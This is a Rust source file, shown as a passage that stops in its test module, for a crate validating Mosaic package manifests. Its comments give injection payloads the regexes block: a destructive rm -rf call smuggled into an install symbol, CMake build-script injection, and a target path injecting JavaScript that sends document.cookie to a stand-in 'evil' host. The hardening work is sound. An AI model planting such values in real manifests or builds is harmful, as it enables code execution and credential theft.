//! # mosaic-package-manifest
//!
//! Parser and validator for `mosaic-package.toml` files, the manifest format
//! defined in **UI29 §4.1 / §4.2** (Mosaic Primitive Kernel — package layer).
//!
//! ## Why a manifest at all?
//!
//! The Mosaic primitive kernel needs to know three things before it can load
//! a package off disk:
//!
//! 1. **Who is this package?**            → `[package]` (name, version, …)
//! 2. **What does it publish?**           → `[components]` (PascalCase exports)
//! 3. **What does it need from me?**      → `[dependencies]` and `[kernel]`
//!
//! Those core sections plus optional `[styles]` and `[host_assets]` resources
//! answer those questions, and **nothing else** is permitted to depend on file
//! layout or directory scanning. The manifest is the single source of truth
//! for what a package is.
//!
//! ## Worked example
//!
//! ```
//! use mosaic_package_manifest::parse;
//!
//! let src = r#"
//! [package]
//! name = "mosaic-pkg-grid"
//! version = "0.1.0"
//! description = "Spreadsheet-style data grid"
//! license = "MIT OR Apache-2.0"
//!
//! [components]
//! exports = ["Grid", "Cell", "Column"]
//!
//! [dependencies]
//!
//! [kernel]
//! version = "1"
//! "#;
//!
//! let pkg = parse(src).expect("manifest valid");
//! assert_eq!(pkg.package.name, "mosaic-pkg-grid");
//! assert_eq!(pkg.components.exports, vec!["Grid", "Cell", "Column"]);
//! assert!(pkg.dependencies.is_empty());
//! assert_eq!(pkg.kernel.version, "1");
//! ```
//!
//! ## The validation philosophy
//!
//! This parser performs **structural** validation, not **interpretive**
//! validation.  That is:
//!
//! - It rejects `package.name = "Mosaic_Grid"` because the *shape* is wrong
//!   (kebab-case violation).
//! - It does **not** reject `package.license = "definitely a license"`
//!   because the meaning of that string belongs to the SPDX validator, not
//!   to the manifest parser.
//!
//! This boundary makes the parser cheap, testable, and stable: it never
//! needs to know about real-world identifiers, only about character classes.
//!
//! ## Error model in one table
//!
//! | Variant                 | Triggered by                                          |
//! |-------------------------|--------------------------------------------------------|
//! | `TomlSyntax`            | `toml::de::Error` — file is not even valid TOML       |
//! | `MissingField`          | a required `[section].field` is absent                |
//! | `InvalidPackageName`    | `package.name` or a dependency key not kebab-case     |
//! | `InvalidComponentName`  | an entry in `components.exports` not PascalCase       |
//! | `InvalidKernelVersion`  | `kernel.version` is anything other than `"1"`         |
//! | `InvalidSemverString`   | `package.version` or a dependency value not semver-y  |
//! | `InvalidStylePath`      | `[styles].token_palette` is not a safe relative JSON path |
//! | `DuplicateHostEffectHandler` | two `[host_effects].handlers` for one backend |
//! | `HostEffectFileWithoutHandler` | a `[host_effects].files` backend declares no handler |
//! | `InvalidHostEffectTarget` | a `[host_effects].files` target is not a plain relative path |
//! | `InvalidHostAssetPath` | a `[host_assets].files` source/target is not a plain relative path |
//!
//! Each error is *one cause, one variant* — no compound errors, no batched
//! collection.  The first thing wrong with the manifest is the only thing
//! the caller hears about; fixing it and re-running is the workflow.

use std::collections::{HashMap, HashSet};
use std::fs;
use std::path::Path;

use serde::Deserialize;

// ---------------------------------------------------------------------------
// Public IR
// ---------------------------------------------------------------------------

/// A fully parsed and validated `mosaic-package.toml`.
///
/// Every field on every nested struct has already been syntactically checked
/// by the time you hold one of these — you can hand it to the kernel loader
/// without re-validating.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct MosaicPackage {
    pub package: PackageMeta,
    pub components: ComponentsSection,
    pub dependencies: HashMap<String, String>,
    pub styles: StylesSection,
    pub host_assets: HostAssetsSection,
    pub host_effects: HostEffectsSection,
    pub kernel: KernelSection,
}

/// Optional package-owned style resources.
///
/// `token_palette` is a package-relative path to a schema-v1 Mosaic token
/// palette. Package builders treat it as this package's design-system
/// defaults; a consuming package and an explicit application palette may
/// override those values without copying the file.
#[derive(Debug, Clone, PartialEq, Eq, Default)]
pub struct StylesSection {
    pub token_palette: Option<String>,
}

/// The `[package]` table: identity + metadata.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct PackageMeta {
    /// Kebab-case identifier, e.g. `mosaic-pkg-grid`.
    pub name: String,
    /// Semver-like string, e.g. `0.1.0` or `1.2.3-rc.4`.
    pub version: String,
    /// Free-text human description; just needs to be non-empty.
    pub description: String,
    /// SPDX expression or any non-empty string the publisher chose.
    pub license: String,
}

/// The `[components]` table: PascalCase exports list.
///
/// An empty list is allowed — a package may be metadata-only (e.g. a
/// dependency aggregator that re-exports via its own dependencies).
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ComponentsSection {
    pub exports: Vec<String>,
}

/// Optional files a package wants copied into generated host project shells,
/// and the third-party dependencies those files need in order to compile.
#[derive(Debug, Clone, PartialEq, Eq, Default)]
pub struct HostAssetsSection {
    pub files: Vec<HostAsset>,
    /// Dependencies a host asset needs, which the generated project would not
    /// otherwise declare.
    ///
    /// `[host_assets]` lets a package replace a generated host file, but until
    /// now gave it no way to say what that replacement *needs*. So a host asset
    /// importing a library outside the emitter's own set produced a project
    /// that could not compile, and the only fix was patching the generated
    /// build file out of band.
    ///
    /// Engram hit exactly that: its Compose host imports `org.json`, the
    /// emitted `build.gradle.kts` never declared it, and the emitted Compose
    /// project had therefore **never compiled** without a PowerShell script
    /// editing it afterwards — which meant the Linux CI runner could not build
    /// it at all.
    pub dependencies: Vec<HostAssetDependency>,
}

/// One third-party dependency a host asset needs, for one backend.
///
/// `coordinate` is passed through verbatim in whatever form the backend's
/// package manager expects — a Maven coordinate for Compose, an npm
/// name-and-range for Electron. The manifest deliberately does not try to model
/// every ecosystem's version syntax; it carries the string the generated build
/// file needs.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct HostAssetDependency {
    pub backend: String,
    pub coordinate: String,
}

/// A single package-relative file copy into one backend output directory.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct HostAsset {
    pub backend: String,
    pub source: String,
    pub target: String,
}

/// Optional per-backend effect handlers, and the files that implement them.
///
/// `[host_assets]` already lets a package put a file into a generated project,
/// but nothing generated ever *calls* into one. Every host template can answer
/// an `Effect`, and an application can emit one, and until this section existed
/// there was no way to connect the two: the entry point that would install a
/// handler — `main.cpp`, `Main.kt` — is generated, so package code cannot reach
/// it. See UI47 §5.4a for the gap and §5.5 for this design.
#[derive(Debug, Clone, PartialEq, Eq, Default)]
pub struct HostEffectsSection {
    /// Files copied into the backend output directory **and added to that
    /// backend's build source list**.
    ///
    /// The second half matters on the backends whose builds name their sources
    /// explicitly. Qt's generated `CMakeLists.txt` lists `main.cpp` and
    /// `MosaicHost.cpp`/`.h`, and XAML's project is the same shape, so a file
    /// merely copied in is never compiled there — and those are the backends a
    /// handler has to reach.
    ///
    /// Not, as an earlier draft of this comment claimed, because `[host_assets]`
    /// can never append a source: it can, on React and HTML through
    /// `activate_react_host_asset` / `activate_html_host_asset`, and implicitly
    /// wherever SwiftPM or Gradle compiles a directory.
    pub files: Vec<HostEffectFile>,
    /// At most one handler per backend.
    pub handlers: Vec<HostEffectHandler>,
}

/// One package-relative file copy into one backend output directory, which the
/// generated build is also told to compile.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct HostEffectFile {
    pub backend: String,
    pub source: String,
    pub target: String,
}

/// How one backend's generated entry point installs the package's handler.
///
/// `install` names the symbol the entry point calls. What it receives differs
/// per backend, and deliberately: the host is passed where there is an instance
/// to pass, and not where there is not — XAML's generated host is a static
/// class, so its handler reaches it by name. UI47 §5.5.3 carries the table.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct HostEffectHandler {
    pub backend: String,
    /// Optional, and backend-interpreted: a C++ `#include`, a Dart `import`,
    /// or nothing at all where the symbol is already in scope.
    pub include: Option<String>,
    pub install: String,
}

/// The `[kernel]` table: which ABI version of the primitive kernel this
/// package targets.  Currently only `"1"` is recognized.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct KernelSection {
    pub version: String,
}

// ---------------------------------------------------------------------------
// Errors
// ---------------------------------------------------------------------------

/// Everything that can go wrong while parsing a manifest.
///
/// Each variant maps to exactly one structural failure mode; see the table
/// in the crate-level docs for the full mapping.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum ManifestError {
    /// The TOML did not even parse.  Payload is `toml::de::Error::to_string()`.
    TomlSyntax(String),
    /// A required field was absent.  E.g. `[package]` table missing entirely,
    /// or `version` missing from `[package]`.
    MissingField { section: String, field: String },
    /// A package name (in `[package].name` or a key under `[dependencies]`)
    /// did not match the kebab-case regex.
    InvalidPackageName(String),
    /// A component export name was not PascalCase.
    InvalidComponentName(String),
    /// `kernel.version` was something other than `"1"`.
    InvalidKernelVersion(String),
    /// A version string (in `[package].version` or a `[dependencies]` value)
    /// did not match the semver-like regex.
    InvalidSemverString(String),
    /// `[styles].token_palette` was not a safe, portable package-relative
    /// JSON path.
    InvalidStylePath(String),
    /// A `[host_effects]` `install` symbol was not a plausible identifier.
    ///
    /// It is interpolated verbatim into generated source as a call expression,
    /// so an unshaped string is an arbitrary statement in someone's entry point.
    InvalidHostEffectSymbol(String),
    /// A `[host_effects]` `include` was not a plausible header or import.
    ///
    /// It lands inside `#include "..."`, so a quote and a newline rewrite the
    /// translation unit.
    InvalidHostEffectInclude(String),
    /// A `[host_assets]` `source` or `target` was not a plain relative path.
    ///
    /// The target is interpolated into generated JavaScript by two emitters, so
    /// an unshaped value is code injection rather than an odd filename.
    InvalidHostAssetPath { field: String, value: String },
    /// A `[host_effects]` `target` was not a plain relative file path.
    ///
    /// It is interpolated into the generated build file, so an unshaped value is
    /// build-script injection rather than merely an odd filename.
    InvalidHostEffectTarget(String),
    /// A `[host_effects]` entry used `*` as its backend.
    ///
    /// `[host_assets]` accepts `*` because copying one file to every backend is
    /// meaningful. Installing one handler everywhere is not: the install
    /// contract differs per backend by design -- the host is passed where there
    /// is an instance and not where there is not -- so one symbol cannot serve
    /// all five. Refused rather than silently matching nothing.
    HostEffectWildcardBackend { section: String },
    /// Two `[host_effects].files` entries write the same target for one backend.
    ///
    /// The later copy wins and the earlier file is silently not what gets
    /// compiled -- the same last-wins hazard refused for handlers.
    DuplicateHostEffectFile { backend: String, target: String },
    /// Two `[host_effects].handlers` entries named the same backend.
    ///
    /// Refused rather than last-wins: both would be installed, the second would
    /// overwrite the first's registration, and the first's effects would go
    /// unanswered -- which is the failure the whole mechanism exists to prevent.
    DuplicateHostEffectHandler { backend: String },
    /// A `[host_effects].files` entry names a backend with no handler, so the
    /// emitter would copy and compile a file nothing calls into.
    HostEffectFileWithoutHandler { backend: String, source: String },
}

impl std::fmt::Display for ManifestError {
    // The `Display` impl exists so consumers can `?` errors up to a CLI
    // top-level handler that just prints them.  We keep messages short and
    // diagnostic — they tell you *which* field broke, not how to fix it.
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::TomlSyntax(e) => write!(f, "TOML syntax error: {e}"),
            Self::MissingField { section, field } => {
                write!(f, "missing required field [{section}].{field}")
            }
            Self::InvalidPackageName(n) => {
                write!(
                    f,
                    "invalid package name `{n}` (must be kebab-case starting with a letter)"
                )
            }
            Self::InvalidComponentName(n) => {
                write!(f, "invalid component name `{n}` (must be PascalCase)")
            }
            Self::InvalidKernelVersion(v) => {
                write!(
                    f,
                    "invalid kernel version `{v}` (only \"1\" is currently supported)"
                )
            }
            Self::InvalidSemverString(v) => {
                write!(f, "invalid semver-like version string `{v}`")
            }
            Self::InvalidStylePath(path) => write!(
                f,
                "invalid style resource path `{path}` (must be a package-relative .json path without `.` or `..` components)"
            ),
            Self::InvalidHostEffectSymbol(value) => write!(
                f,
                "invalid `[host_effects]` install symbol `{value}` (must be an \
                 identifier, optionally qualified with `.` or `::`)"
            ),
            Self::InvalidHostEffectInclude(value) => write!(
                f,
                "invalid `[host_effects]` include `{value}` (must be a relative \
                 header path or an import name, with no `..` component)"
            ),
            Self::InvalidHostAssetPath { field, value } => write!(
                f,
                "invalid `[host_assets]` {field} `{value}` (must be a relative \
                 file path of plain name segments, with no `..` component)"
            ),
            Self::InvalidHostEffectTarget(value) => write!(
                f,
                "invalid `[host_effects]` target `{value}` (must be a relative \
                 file path of plain name segments, with no `..` component)"
            ),
            Self::HostEffectWildcardBackend { section } => write!(
                f,
                "`[host_effects].{section}` used `*` as a backend; one handler \
                 cannot serve every backend, because what `install` receives \
                 differs per backend"
            ),
            Self::DuplicateHostEffectFile { backend, target } => write!(
                f,
                "two `[host_effects].files` entries write `{target}` for backend \
                 `{backend}`; the later copy would silently win"
            ),
            Self::DuplicateHostEffectHandler { backend } => write!(
                f,
                "two `[host_effects].handlers` entries for backend `{backend}`; \
                 one backend installs one handler, and a second would overwrite \
                 the first's registration"
            ),
            Self::HostEffectFileWithoutHandler { backend, source } => write!(
                f,
                "`[host_effects].files` entry `{source}` targets backend `{backend}`, \
                 which declares no handler; the file would be copied and compiled \
                 with nothing calling into it"
            ),
        }
    }
}

impl std::error::Error for ManifestError {}

// ---------------------------------------------------------------------------
// Raw deserialization shape
// ---------------------------------------------------------------------------
//
// We do **not** want serde to also do validation.  We make every section
// optional at the serde layer so that *missing-section* is reported by our
// own `MissingField` variant rather than by serde's generic
// "missing field `package`" message — that way the error model is uniform.

#[derive(Debug, Deserialize)]
struct RawManifest {
    package: Option<RawPackage>,
    components: Option<RawComponents>,
    dependencies: Option<HashMap<String, String>>,
    styles: Option<RawStyles>,
    host_assets: Option<RawHostAssets>,
    host_effects: Option<RawHostEffects>,
    kernel: Option<RawKernel>,
}

#[derive(Debug, Deserialize)]
#[serde(deny_unknown_fields)]
struct RawStyles {
    token_palette: Option<String>,
}

#[derive(Debug, Deserialize)]
struct RawPackage {
    name: Option<String>,
    version: Option<String>,
    description: Option<String>,
    license: Option<String>,
}

#[derive(Debug, Deserialize)]
struct RawComponents {
    exports: Option<Vec<String>>,
}

#[derive(Debug, Deserialize)]
#[serde(deny_unknown_fields)]
struct RawHostEffects {
    files: Option<Vec<RawHostEffectFile>>,
    handlers: Option<Vec<RawHostEffectHandler>>,
}

#[derive(Debug, Deserialize)]
#[serde(deny_unknown_fields)]
struct RawHostEffectFile {
    backend: Option<String>,
    source: Option<String>,
    target: Option<String>,
}

#[derive(Debug, Deserialize)]
#[serde(deny_unknown_fields)]
struct RawHostEffectHandler {
    backend: Option<String>,
    include: Option<String>,
    install: Option<String>,
}

#[derive(Debug, Deserialize)]
#[serde(deny_unknown_fields)]
struct RawHostAssets {
    files: Option<Vec<RawHostAsset>>,
    dependencies: Option<Vec<RawHostAssetDependency>>,
}

#[derive(Debug, Deserialize)]
struct RawHostAsset {
    backend: Option<String>,
    source: Option<String>,
    target: Option<String>,
}

#[derive(Debug, Deserialize)]
struct RawHostAssetDependency {
    backend: Option<String>,
    coordinate: Option<String>,
}

#[derive(Debug, Deserialize)]
struct RawKernel {
    version: Option<String>,
}

// ---------------------------------------------------------------------------
// Validation regexes
// ---------------------------------------------------------------------------
//
// These three regexes encode the entire shape contract.  They are compiled
// at first use via a tiny manual `OnceLock` — no `lazy_static!`, no
// `once_cell` — so the dep tree stays at exactly {serde, toml, regex}.

use regex::Regex;
use std::sync::OnceLock;

fn kebab_case_re() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    // Kebab-case: lowercase letter start, then lowercase-alphanumeric, with
    // hyphens between segments.  Each segment must also start with a letter
    // (so `a-1b` is fine but `a--b` and `a-1` would each be wrong — the
    // second segment `1` would fail the segment-starts-with-letter rule).
    RE.get_or_init(|| Regex::new(r"^[a-z][a-z0-9]*(-[a-z][a-z0-9]*)*$").unwrap())
}

fn pascal_case_re() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    // PascalCase: uppercase letter start, then any alphanumerics.
    // (We do *not* require an internal uppercase — `A` is valid PascalCase.)
    RE.get_or_init(|| Regex::new(r"^[A-Z][a-zA-Z0-9]*$").unwrap())
}

fn host_effect_symbol_re() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    // `install` is interpolated VERBATIM into generated source as a call
    // expression -- `installProbeEffects(mosaicHost);` in C++, the equivalent in
    // four other languages. Without a shape, TOML's `\"` and `\n` escape the
    // slot: `install = "system(\"rm -rf /\"); dummy"` is an arbitrary statement
    // in someone's `main.cpp`.
    //
    // A package can already ship compiled source through `[host_assets]`, so
    // this is not a new privilege. It is the first place executable text lives
    // in the MANIFEST STRING rather than in a file, which defeats any review
    // that reads files, and it costs nothing to close.
    //
    // Dotted and double-coloned segments are allowed because Kotlin, Dart and
    // C# name qualified symbols that way.
    RE.get_or_init(|| {
        Regex::new(r"^[A-Za-z_][A-Za-z0-9_]*([.:]{1,2}[A-Za-z_][A-Za-z0-9_]*)*$").unwrap()
    })
}

fn host_effect_include_re() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    // The same reasoning one slot over: `include` lands inside `#include "..."`,
    // so a `"` plus a newline rewrites the translation unit.
    //
    // A positive charset rather than a denylist of quote-and-newline, wide
    // enough for every form the five backends use: a relative header path
    // (`effects.h`), a dotted import (`com.example.Effects`), and Dart's
    // `package:` scheme. `..` is excluded separately, since the regex cannot
    // express "no dot-dot component" without becoming unreadable.
    RE.get_or_init(|| Regex::new(r"^[A-Za-z0-9_][A-Za-z0-9_.:/-]*$").unwrap())
}

fn manifest_target_path_re() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    // `target` is interpolated into the generated BUILD FILE, not only used as
    // a destination path -- Qt space-joins the targets into
    // `target_sources(App PRIVATE ...)`. Without a shape that is CMake
    // injection, and the lexical path check the emitter applies does not stop
    // it: a newline and a `)` are legal in a Unix filename, so
    //
    //   target = "e.cpp)\nexecute_process(COMMAND sh -c \"...\")\n#"
    //
    // splits into ordinary `Normal` components, passes, and runs at CMake
    // CONFIGURE time on whoever builds the emitted project.
    //
    // Validated here rather than in the emitter because every backend
    // interpolates this string into some generated file, and one check covers
    // them all instead of one per emitter that must each be remembered.
    //
    // Shared with `[host_assets]`, whose `target` reaches two more sinks:
    // `activate_react_host_asset` prepends `import "./{target}";` to the
    // generated `main.tsx`, and the HTML one emits `<script src="./{target}">`.
    // A `"` and a `\n` are legal in a Unix filename there too, so
    //
    //   target = 'src/x";fetch("http://evil/"+document.cookie);//.ts'
    //
    // becomes executable JavaScript on line 1 of the emitted app. Fixing only
    // the section whose sink happened to be a BUILD file would have been the
    // wrong half of the job.
    RE.get_or_init(|| {
        Regex::new(r"^[A-Za-z0-9_][A-Za-z0-9_.-]*(/[A-Za-z0-9_][A-Za-z0-9_.-]*)*$").unwrap()
    })
}

fn semver_re() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    // Semver-like: MAJOR.MINOR.PATCH with an optional pre-release suffix.
    // We deliberately don't pull in the full `semver` crate — the manifest
    // shape only needs the *string form* to look right; the kernel loader
    // can do real version-range arithmetic when it resolves dependencies.
    RE.get_or_init(|| Regex::new(r"^\d+\.\d+\.\d+(-[A-Za-z0-9.-]+)?$").unwrap())
}

// ---------------------------------------------------------------------------
// Public API
// ---------------------------------------------------------------------------

/// Parse and validate a `mosaic-package.toml` manifest from a string.
///
/// Returns `Err` on the first structural problem encountered; see
/// [`ManifestError`] for the exhaustive list of possible failures.
pub fn parse(toml_source: &str) -> Result<MosaicPackage, ManifestError> {
    // Step 1: turn raw bytes into TOML.  Any failure here is purely syntactic
    // and we wrap it as `TomlSyntax(message)`.
    let raw: RawManifest =
        toml::from_str(toml_source).map_err(|e| ManifestError::TomlSyntax(e.to_string()))?;

    // Step 2: every required section must exist.
    let raw_pkg = raw.package.ok_or(ManifestError::MissingField {
        section: "package".into(),
        field: "<section>".into(),
    })?;
    let raw_components = raw.components.ok_or(ManifestError::MissingField {
        section: "components".into(),
        field: "<section>".into(),
    })?;
    let raw_kernel = raw.kernel.ok_or(ManifestError::MissingField {
        section: "kernel".into(),
        field: "<section>".into(),
    })?;
    // `[dependencies]` is the one section that may be absent — a package
    // with no deps still has to declare *something* for the kernel to read,
    // but TOML conventionally lets you omit empty tables.  We accept either.
    let raw_deps = raw.dependencies.unwrap_or_default();
    let raw_host_assets = raw.host_assets;
    let raw_host_effects = raw.host_effects;

    // Step 3: validate the `[package]` section field by field.
    let package = validate_package(raw_pkg)?;

    // Step 4: validate `[components]`.
    let components = validate_components(raw_components)?;

    // Step 5: validate `[dependencies]` — each (name, version) pair must
    // satisfy the same kebab/semver rules as `[package]`.
    let dependencies = validate_dependencies(raw_deps)?;

    // Step 6: validate optional package-owned style resources.
    let styles = validate_styles(raw.styles)?;

    // Step 7: validate optional host asset declarations.
    let host_assets = validate_host_assets(raw_host_assets)?;
    let host_effects = validate_host_effects(raw_host_effects)?;

    // Step 8: validate `[kernel]`.
    let kernel = validate_kernel(raw_kernel)?;

    Ok(MosaicPackage {
        package,
        components,
        dependencies,
        styles,
        host_assets,
        host_effects,
        kernel,
    })
}

fn validate_styles(raw: Option<RawStyles>) -> Result<StylesSection, ManifestError> {
    let Some(path) = raw.and_then(|styles| styles.token_palette) else {
        return Ok(StylesSection::default());
    };
    let portable = !path.is_empty()
        && !path.starts_with('/')
        && !path.starts_with('\\')
        && !path.contains('\\')
        && path.ends_with(".json")
        && path
            .split('/')
            .all(|component| !component.is_empty() && component != "." && component != "..");
    if !portable {
        return Err(ManifestError::InvalidStylePath(path));
    }
    Ok(StylesSection {
        token_palette: Some(path),
    })
}

/// Read a manifest file from disk and parse it.
///
/// IO errors are surfaced as `TomlSyntax(io error: …)` for a uniform error
/// model — the caller doesn't generally care whether the manifest was
/// unreadable or unparseable, only that it could not be loaded.
pub fn parse_path(path: &Path) -> Result<MosaicPackage, ManifestError> {
    let source = fs::read_to_string(path)
        .map_err(|e| ManifestError::TomlSyntax(format!("io error reading manifest: {e}")))?;
    parse(&source)
}

// ---------------------------------------------------------------------------
// Validators (one per section)
// ---------------------------------------------------------------------------

fn validate_package(raw: RawPackage) -> Result<PackageMeta, ManifestError> {
    // Every field on `[package]` is required.  We surface absence with
    // section+field labels so the error is actionable.
    let name = require(raw.name, "package", "name")?;
    let version = require(raw.version, "package", "version")?;
    let description = require(raw.description, "package", "description")?;
    let license = require(raw.license, "package", "license")?;

    // Structural checks.
    if !kebab_case_re().is_match(&name) {
        return Err(ManifestError::InvalidPackageName(name));
    }
    if !semver_re().is_match(&version) {
        return Err(ManifestError::InvalidSemverString(version));
    }
    if description.is_empty() {
        return Err(ManifestError::MissingField {
            section: "package".into(),
            field: "description".into(),
        });
    }
    if license.is_empty() {
        return Err(ManifestError::MissingField {
            section: "package".into(),
            field: "license".into(),
        });
    }

    Ok(PackageMeta {
        name,
        version,
        description,
        license,
    })
}

fn validate_components(raw: RawComponents) -> Result<ComponentsSection, ManifestError> {
    // `exports` is the only field, and it is required to be present (even
    // if empty).  This makes "I forgot to declare what I export" loud, and
    // distinguishes it from "I have nothing to export."
    let exports = require(raw.exports, "components", "exports")?;
    for name in &exports {
        if !pascal_case_re().is_match(name) {
            return Err(ManifestError::InvalidComponentName(name.clone()));
        }
    }
    Ok(ComponentsSection { exports })
}

fn validate_dependencies(
    raw: HashMap<String, String>,
) -> Result<HashMap<String, String>, ManifestError> {
    // Each (key, value) pair is a (package-name, semver) pair and gets
    // exactly the same validation as `[package]`.
    for (dep_name, dep_version) in &raw {
        if !kebab_case_re().is_match(dep_name) {
            return Err(ManifestError::InvalidPackageName(dep_name.clone()));
        }
        if !semver_re().is_match(dep_version) {
            return Err(ManifestError::InvalidSemverString(dep_version.clone()));
        }
    }
    Ok(raw)
}

fn validate_host_assets(raw: Option<RawHostAssets>) -> Result<HostAssetsSection, ManifestError> {
    let Some(raw) = raw else {
        return Ok(HostAssetsSection::default());
    };
    let raw_files = raw.files.unwrap_or_default();
    let mut files = Vec::with_capacity(raw_files.len());

    for file in raw_files {
        let backend = require_non_empty(file.backend, "host_assets.files", "backend")?;
        let source = require_non_empty(file.source, "host_assets.files", "source")?;
        let target = require_non_empty(file.target, "host_assets.files", "target")?;
        for (label, value) in [("source", &source), ("target", &target)] {
            if !manifest_target_path_re().is_match(value)
                || value.split('/').any(|part| part == "..")
            {
                return Err(ManifestError::InvalidHostAssetPath {
                    field: label.to_string(),
                    value: value.clone(),
                });
            }
        }
        files.push(HostAsset {
            backend,
            source,
            target,
        });
    }

    let raw_dependencies = raw.dependencies.unwrap_or_default();
    let mut dependencies = Vec::with_capacity(raw_dependencies.len());
    for dependency in raw_dependencies {
        let backend = require_non_empty(dependency.backend, "host_assets.dependencies", "backend")?;
        let coordinate = require_non_empty(
            dependency.coordinate,
            "host_assets.dependencies",
            "coordinate",
        )?;
        dependencies.push(HostAssetDependency {
            backend,
            coordinate,
        });
    }

    Ok(HostAssetsSection {
        files,
        dependencies,
    })
}

fn validate_host_effects(raw: Option<RawHostEffects>) -> Result<HostEffectsSection, ManifestError> {
    let Some(raw) = raw else {
        return Ok(HostEffectsSection::default());
    };

    let raw_handlers = raw.handlers.unwrap_or_default();
    let mut handlers: Vec<HostEffectHandler> = Vec::with_capacity(raw_handlers.len());
    let mut handler_backends: HashSet<String> = HashSet::with_capacity(raw_handlers.len());
    for handler in raw_handlers {
        let backend = require_non_empty(handler.backend, "host_effects.handlers", "backend")?;
        reject_wildcard_backend(&backend, "handlers")?;
        // One per backend, refused rather than last-wins. Two would both be
        // installed and the second would overwrite the first's registration, so
        // the first's effects would go unanswered -- the exact failure this
        // mechanism exists to prevent. Silently keeping one would hide it.
        if !handler_backends.insert(backend.clone()) {
            return Err(ManifestError::DuplicateHostEffectHandler { backend });
        }
        let include = match handler.include {
            // Present-but-empty reads as "no include needed", which is what
            // absent already means -- so accepting it would make a typo
            // indistinguishable from a decision.
            Some(include) => {
                let include = require_non_empty(Some(include), "host_effects.handlers", "include")?;
                // The scheme is stripped BEFORE the rest is checked, rather
                // than the whole string being checked and a colon test bolted
                // on. `:` is in the charset for Dart's `package:` form, which
                // also admitted `C:/Users/Public/backdoor.h` -- an absolute path
                // every MSVC-family compiler resolves. And validating the whole
                // string first cannot see a `..` welded to a scheme, so
                // `package:../x` satisfied a `split('/')` check that never had a
                // `..` segment to find. Splitting first makes the stated
                // invariant -- no `..`, nothing absolute, no second colon --
                // actually hold.
                let rest = include.strip_prefix("package:").unwrap_or(&include);
                if !host_effect_include_re().is_match(&include)
                    || rest.contains(':')
                    || rest.starts_with('/')
                    || rest.split('/').any(|part| part == "..")
                {
                    return Err(ManifestError::InvalidHostEffectInclude(include));
                }
                Some(include)
            }
            None => None,
        };
        let install = require_non_empty(handler.install, "host_effects.handlers", "install")?;
        if !host_effect_symbol_re().is_match(&install) {
            return Err(ManifestError::InvalidHostEffectSymbol(install));
        }
        handlers.push(HostEffectHandler {
            backend,
            include,
            install,
        });
    }

    let raw_files = raw.files.unwrap_or_default();
    let mut files = Vec::with_capacity(raw_files.len());
    let mut seen_targets: HashSet<(String, String)> = HashSet::with_capacity(raw_files.len());
    for file in raw_files {
        let backend = require_non_empty(file.backend, "host_effects.files", "backend")?;
        reject_wildcard_backend(&backend, "files")?;
        let source = require_non_empty(file.source, "host_effects.files", "source")?;
        let target = require_non_empty(file.target, "host_effects.files", "target")?;
        if !manifest_target_path_re().is_match(&target)
            || target.split('/').any(|part| part == "..")
        {
            return Err(ManifestError::InvalidHostEffectTarget(target));
        }
        // A file whose backend declares no handler would be copied into the
        // project and added to the build with nothing calling into it.
        //
        // Checked against the handler set rather than by scanning, which also
        // keeps this linear: a manifest is small, but nothing bounds its length
        // and quadratic validation over an unbounded input is a cost with no
        // upside.
        if !handler_backends.contains(&backend) {
            return Err(ManifestError::HostEffectFileWithoutHandler { backend, source });
        }
        if !seen_targets.insert((backend.clone(), target.clone())) {
            return Err(ManifestError::DuplicateHostEffectFile { backend, target });
        }
        files.push(HostEffectFile {
            backend,
            source,
            target,
        });
    }

    Ok(HostEffectsSection { files, handlers })
}

/// `[host_assets]` accepts `*`; this section does not, and the asymmetry is
/// deliberate.
///
/// Copying one file to every backend is meaningful. Installing one handler
/// everywhere is not: what `install` receives differs per backend by design --
/// the host is passed where there is an instance to pass, and not where there is
/// not -- so one symbol cannot serve all five. Accepting `*` would produce an
/// entry that matches no backend at emission and quietly installs nothing.
fn reject_wildcard_backend(backend: &str, section: &str) -> Result<(), ManifestError> {
    if backend == "*" {
        return Err(ManifestError::HostEffectWildcardBackend {
            section: section.to_string(),
        });
    }
    Ok(())
}

fn validate_kernel(raw: RawKernel) -> Result<KernelSection, ManifestError> {
    let version = require(raw.version, "kernel", "version")?;
    // Only "1" is recognized today.  When the kernel ABI advances we'll add
    // "2" here and bump the major version of this crate — clients shouldn't
    // silently see new ABI versions accepted by an older manifest parser.
    if version != "1" {
        return Err(ManifestError::InvalidKernelVersion(version));
    }
    Ok(KernelSection { version })
}

/// Small helper: turn an `Option<T>` into either the value or a
/// `MissingField { section, field }`.  Keeps every validator uniform.
fn require<T>(opt: Option<T>, section: &str, field: &str) -> Result<T, ManifestError> {
    opt.ok_or_else(|| ManifestError::MissingField {
        section: section.into(),
        field: field.into(),
    })
}

fn require_non_empty(
    opt: Option<String>,
    section: &str,
    field: &str,
) -> Result<String, ManifestError> {
    let value = require(opt, section, field)?;
    if value.is_empty() {
        return Err(ManifestError::MissingField {
            section: section.into(),
            field: field.into(),
        });
    }
    Ok(value)
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;

    /// The happy-path manifest from the spec.  If this ever stops parsing
    /// cleanly, something fundamental is wrong with the validators.
    const GOOD_MANIFEST: &str = r#"
[package]
name = "mosaic-pkg-grid"
version = "0.1.0"
description = "Spreadsheet-style data grid built on UI29 kernel primitives"
license = "MIT OR Apache-2.0"

[components]
exports = ["Grid", "Cell", "Column"]

[dependencies]

[kernel]
version = "1"
"#;

    #[test]
    fn parses_good_manifest() {
        let pkg = parse(GOOD_MANIFEST).expect("good manifest must parse");
        assert_eq!(pkg.package.name, "mosaic-pkg-grid");
